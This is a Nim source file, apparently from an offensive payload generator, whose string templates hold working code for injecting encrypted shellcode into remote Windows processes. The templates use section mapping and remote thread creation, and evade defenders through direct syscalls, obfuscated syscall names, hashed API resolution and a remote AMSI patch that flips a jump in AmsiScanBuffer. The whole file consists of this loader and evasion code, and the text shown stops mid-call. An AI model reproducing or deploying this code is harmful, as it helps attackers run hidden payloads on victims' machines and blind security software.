let ShellcodeRemoteInjectMapSection * = """

        when defined(DInvoke):
            let tProcess2 = MyGetCurrentProcessId()
            var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
        else:
            let tProcess2 = GetCurrentProcessId()
            var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        when defined(GetSyscallStub):
        
            when defined(DInvoke):
                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            else:
                let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
        
            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var syscallStub_NtCreateSection: HANDLE = cast[HANDLE](syscallStub_NtCreate) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var syscallStub_NtMapViewOfSection: HANDLE = cast[HANDLE](syscallStub_NtCreateSection) + cast[HANDLE](SYSCALL_STUB_SIZE)

            # define NtOpenProcess
            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            # define NtWriteVirtualMemory
            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            # define NtCreateThreadEx
            let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
            
            # define NtCreateSection
            let NtCreateSection = cast[myNtCreateSection](cast[LPVOID](syscallStub_NtCreateSection))
            VirtualProtect(cast[LPVOID](syscallStub_NtCreateSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            # define NtMapViewOfSection
            let NtMapViewOfSection = cast[myNtMapViewOfSection](cast[LPVOID](syscallStub_NtMapViewOfSection))
            VirtualProtect(cast[LPVOID](syscallStub_NtMapViewOfSection), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))
            success = GetSyscallStub("NtCreateSection", cast[LPVOID](syscallStub_NtCreateSection))
            success = GetSyscallStub("NtMapViewOfSection", cast[LPVOID](syscallStub_NtMapViewOfSection))
        
        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)

            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), toHex(status)

                        # NtCreateSection Call

            var 
                hMapFile: HANDLE
                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

            status = iuhqdihasduiahsdaksdhak(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
            when defined(verbose):
                echo obf("[*] NtCreateSection: "), toHex(status)

            var
                lpMapAddress: PVOID = NULL
                vSize: SIZE_T = sc_size
            # NtMapViewOfSection Call local
            status = uihzasdbnqlpoasdlykxc(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

            when defined(verbose):
                echo obf("[*] NtMapViewOfSection: "), toHex(status)
            if (lpMapAddress == nil):
                echo obf("[-] Failed to map view of file")
                echo GetLastError()

            
            var bytesWritten: SIZE_T
            # NtWriteVirtualMemory Call
            status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            var lpMapAddressRemote: PVOID = NULL
            # NtMapViewOfSection Call remote
            status = uihzasdbnqlpoasdlykxc(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
            
            if (lpMapAddressRemote == nil):
                echo obf("[-] Failed to map view of file remote")
                echo GetLastError()
            when defined(sleepinbetween):
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            decryptlate()
            
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)

            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(pHandle)

            when defined(verbose):
                echo success
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
        
            status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), toHex(status)
        
            when defined(Hellsgate):
                if getSyscall(ntCreateSectionTable):
                    syscall = ntCreateSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateSection")
            
            # NtCreateSection Call

            var 
                hMapFile: HANDLE
                sSize: LARGE_INTEGER = cast[LARGE_INTEGER](sc_size)

            status = NtCreateSection(&hMapFile,SECTION_MAP_READ or SECTION_MAP_WRITE or SECTION_MAP_EXECUTE,NULL,&sSize,PAGE_EXECUTE_READWRITE,SEC_COMMIT,0)
            when defined(verbose):
                echo obf("[*] NtCreateSection: "), toHex(status)
            #var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)            
            
            if (hMapFile == 0):
                echo obf("[-] Failed to create file mapping")
                echo GetLastError()
            
            when defined(Hellsgate):
                if getSyscall(ntMapViewOfSectionTable):
                    syscall = ntMapViewOfSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")
            
            var
                lpMapAddress: PVOID = NULL
                vSize: SIZE_T = sc_size

            status = NtMapViewOfSection(hMapFile,-1,&lpMapAddress,0,0,NULL,&vSize,2,0,PAGE_READWRITE)

            when defined(verbose):
                echo obf("[*] NtMapViewOfSection: "), toHex(status)

            if (lpMapAddress == nil):
                echo obf("[-] Failed to map view of file")
                echo GetLastError()
         
            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
            var bytesWritten: SIZE_T
            status = NtWriteVirtualMemory(
                pHandle2, 
                lpMapAddress, 
                unsafeAddr friendlycode, 
                sc_size, 
                addr bytesWritten)
            
            when defined(Hellsgate):
                if getSyscall(ntMapViewOfSectionTable):
                    syscall = ntMapViewOfSectionTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtMapViewOfSection")

            var lpMapAddressRemote: PVOID = NULL
            status = NtMapViewOfSection(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
            
            if (lpMapAddressRemote == nil):
                echo obf("[-] Failed to map view of file remote")
                echo GetLastError()
            when defined(sleepinbetween):
                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
            ptrEncText = cast[ptr byte](lpMapAddress)
            ptrDecText = cast[ptr byte](lpMapAddress)
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
            decryptlate()
            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                pHandle,
                lpMapAddressRemote, 
                NULL, FALSE, 0, 0, 0, NULL)
            when defined(verbose):
                echo obf("[*] NtCreateThreadEx: "), toHex(status)

    injectCreateRemoteThread(enctext) 

when not defined(proxy):
    discard main(nil)

when defined(defaultMain):
    discard main(nil)

"""


let ShellcoderemoteinjectStub * = """
    
        when defined(DInvoke):
            let tProcess2 = MyGetCurrentProcessId()
            var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
        else:
            let tProcess2 = GetCurrentProcessId()
            var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        var 
            oldProtection: DWORD = 0
            status: NTSTATUS
            success: BOOL
        
        when defined(GetSyscallStub):
        
            when defined(DInvoke):
                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            else:
                let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
        
            var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
            var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)

            # define NtOpenProcess
            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

            # define NtAllocateVirtualMemory
            let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
            VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

            # define NtWriteVirtualMemory
            let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
            VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

            # define NtCreateThreadEx
            let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
            VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
            success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
            success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

        ptrEncText = cast[ptr byte](addr encText[0])
        ptrDecText = cast[ptr byte](addr decText[0])
        decryptlate()
        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)

            when defined(verbose):
                echo obf("[*] opqiwepoausdasdjl: "), status

            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] opqiwepoausdasdjl: "), status
            var bytesWritten: SIZE_T

            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] oqiazasusjk: "), status
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
            #ptrEncText = cast[ptr byte](ds)
            #ptrDecText = cast[ptr byte](ds)
            #decryptlate()
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)

            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(pHandle)

            when defined(verbose):
                echo success
        else:

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")
        
            status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), status
        
            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), status
            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            status = NtWriteVirtualMemory(
                pHandle, 
                ds, 
                unsafeAddr friendlycode, 
                sc_size-1, 
                addr bytesWritten)

            when defined(verbose):
                echo obf("[*] NtWriteVirtualMemory: "), status
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")
        
            when defined(Hellsgate):
                if getSyscall(ntCreateTable):
                    syscall = ntCreateTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
            #ptrEncText = cast[ptr byte](ds)
            #ptrDecText = cast[ptr byte](ds)
            #decryptlate()
            status = NtCreateThreadEx(
                &tHandle, 
                THREAD_ALL_ACCESS, 
                NULL, 
                pHandle,
                ds, 
                NULL, FALSE, 0, 0, 0, NULL)
        
            when defined(Hellsgate):
                if getSyscall(ntCloseTable):
                    syscall = ntCloseTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtClose")

            status = NtClose(tHandle)
            status = NtClose(pHandle)

            when defined(verbose):
                echo success
    

    injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory

when not defined(proxy):
    discard main(nil)
"""

let ShellcoderemoteinjectStub_notepad * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        var pHandle: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = remoteProcID

"""

let ShellcoderemoteinjectStub_customprocfirst * = """

    proc FindPidByName (processName : string):DWORD =
        try:
            var 
                entry : PROCESSENTRY32A
                snapshot : HANDLE
                pid : DWORD = 0
            snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snapshot != INVALID_HANDLE_VALUE:
                entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
                if Process32FirstA(snapshot,addr entry):
                    while Process32NextA(snapshot,addr entry):
                        pid = entry.th32ProcessID
                        if ($(entry.szExeFile).join()).contains(processName):
                            result = pid
        except: 
            when defined(verbose):
                echo obf("Process ID not found")

    var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
    var found: bool = false
    for m in remoteprocesses:
        if found == true: continue
        when defined(verbose):
            echo obf("Checking: ") & $m
        processID = FindPidByName(m)
        if (processID):
            found = true

    when defined(verbose):
        echo obf("[*] Target Process: "), processID
    var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = """

    proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        var pHandle: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

"""


let RemotePatchAMSIStub* = """

    proc RemotePatchAmsi(hProcss :HANDLE): bool =

        when defined amd64:
            let patch: array[1, byte] = [byte 0x75] # Patch JZ to JNZ
        elif defined i386:
            let patch: array[1, byte] = [byte 0x75] 


        var disabled: bool = false
    
        var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
        if RemoteHandle == 0:
            when defined(verbose):
                echo obf("[X] Failed to get amsi.dll handle")
            return disabled

        var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
        if RemoteProc == NULL:
            when defined(verbose):
                echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
            return disabled
        when defined amd64:
            RemoteProc = RemoteProc + 0x6D
        else:
            RemoteProc = RemoteProc + 0x47
        var oldProtection: DWORD = 0
        var success: BOOL
        var protectAddress = RemoteProc

        var friendlycodeLength = cast[SIZE_T](patch.len)
        var t: ULONG
        var op: ULONG
        var 
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID

        when defined(SysWhispers):
            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")

            var bytesWritten: SIZE_T

            var outLength: SIZE_T
            status = oqiazasusjk(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] oqiazasusjk Succeed!")
                    
            status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                    
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

        else:

            when defined(GetSyscallStub):
                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

                # Define NtProtectVirtualMemory
                var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
                when defined(DInvoke):
                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                # define NtWriteVirtualMemory
                let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
                when defined(DInvoke):
                    success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                else:
                    success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
                
                success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))


            when defined(Hellsgate):
                if getSyscall(ntProtectTable):
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[*] Applying Syscall AMSI patch")
        

            var bytesWritten: SIZE_T

            when defined(Hellsgate):
                if getSyscall(ntWriteTable):
                    syscall = ntWriteTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

            var outLength: SIZE_T
            status = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)

            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to write memory.")
            else:
                when defined(verbose):
                    echo obf("[+] NtWriteVirtualMemory Succeed!")

            when defined(Hellsgate):
                if getSyscall(ntProtectTable):        
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        
            status = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
            if not NT_SUCCESS(status):
                when defined(verbose):
                    echo obf("[-] Failed to allocate memory.")
            else:
                when defined(verbose):
                    echo obf("[+] OldProtect set back")
                disabled = true
            return disabled

    when isMainModule:
        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&hProcams,PROCESS_ALL_ACCESS,&oa, &cid)
        #[
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
                
                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            else:
                let syscallStub_NtOpenP2 = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
            var oldProtection: DWORD = 0
            # define NtOpenProcess
            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
        ]#
        else:
            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            status = NtOpenProcess(
                &hProcams,
                PROCESS_ALL_ACCESS, 
                &oa, &cid         
            )
        when defined(verbose):
            echo obf("[*] NtOpenProcess: "), toHex(status)
        #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)

        success = RemotePatchAmsi(hProcams)
        if (success == 0):
            success = remoteLoadAmsi(remoteProcID)
            HowMuchTimeWouldYoulikeToSleep(2)
            success = RemotePatchAmsi(hProcams)
        when defined(verbose):
            echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

amsRemote()

"""


let RemoteLoadAMSIStub* = """

    proc remoteLoadAmsi(processID: var DWORD): bool =

    
        # C:\windows\system32\amsi.dll
        var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
        char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
        char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
        
        when defined(verbose):
            echo obf("[*] Loading amsi.dll in the remote process: "), processID
        var cid: CLIENT_ID
        var oa: OBJECT_ATTRIBUTES
        var pHandle: HANDLE
        var tHandle: HANDLE
        var ds: LPVOID
        var status: NTSTATUS
        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

        cid.UniqueProcess = processID

        when defined(SysWhispers):
            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)

            when defined(verbose):
                echo obf("[*] opqiwepoausdasdjl: "), status

            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
            when defined(verbose):
                echo obf("[*] oqiahsjynmxkla: "), status
            var bytesWritten: SIZE_T

            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

            when defined(verbose):
                echo obf("[*] oqiazasusjk: "), status
                echo obf("    \\-- bytes written: "), bytesWritten
                echo obf("")

            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
            status = zuatzuastdiasyy(tHandle)
            status = zuatzuastdiasyy(pHandle)
            if(status == 0):
                return true
            else:
                return false
        else:

            when defined(GetSyscallStub):
                when defined(DInvoke):
                    let tProcess2 = MyGetCurrentProcessId()
                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
                    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

                    MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                    let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                else:
                    let tProcess2 = GetCurrentProcessId()
                    let pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

                    let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)

        
                var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
                var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
                var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


                var oldProtection: DWORD = 0

                # define NtOpenProcess
                var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
                VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtAllocateVirtualMemory
                let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
                VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtWriteVirtualMemory
                let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
                VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                # define NtCreateThreadEx
                let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
                VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

                var success: BOOL

                success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
                success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
                success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
                success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

            when defined(Hellsgate):
                if getSyscall(ntOpenTable):
                    syscall = ntOpenTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtOpenProcess")

            status = NtOpenProcess(
                &pHandle,
                PROCESS_ALL_ACCESS, 
                &oa, &cid         
            )
            when defined(verbose):
                echo obf("[*] NtOpenProcess: "), toHex(status)

            when defined(Hellsgate):
                if getSyscall(ntAllocTable):
                    syscall = ntAllocTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

            status = NtAllocateVirtualMemory(
